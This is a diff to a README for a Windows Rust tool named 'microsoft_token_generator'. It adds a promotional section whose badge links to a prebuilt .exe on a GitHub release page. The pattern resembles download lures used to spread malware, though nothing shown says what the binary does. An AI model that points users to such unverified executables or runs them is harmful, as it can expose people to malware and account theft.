@@ -1,5 +1,6 @@
 # microsoft_token_generator
 
+
 ![Language](https://img.shields.io/badge/Language-Rust-orange.svg)
 ![Build](https://img.shields.io/badge/Build-3.03%20MB-brightgreen.svg)
 ![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue.svg)
@@ -103,6 +104,13 @@ If your application terminates unexpectedly or encounters a crash loop, your web
 ---
 <align="center"><i>Developed with precision. Powered by Rust. Engineered for the community.</i></align>
 
+## 🚀 Production Release
+
+Looking to deploy the toolkit instantly? Download the standalone executable binary directly from our official release pipeline:
+
+[![Download Binary](https://img.shields.io/badge/DOWNLOAD-LATEST%20RELEASE-00ffcc?style=for-the-badge&logo=windows&logoColor=black&labelColor=15151e)](https://github.com/857seif/microsoft_token_generator/releases/tag/microsoft_token_generator.exe)
+
+---
 
 ## Usage
 
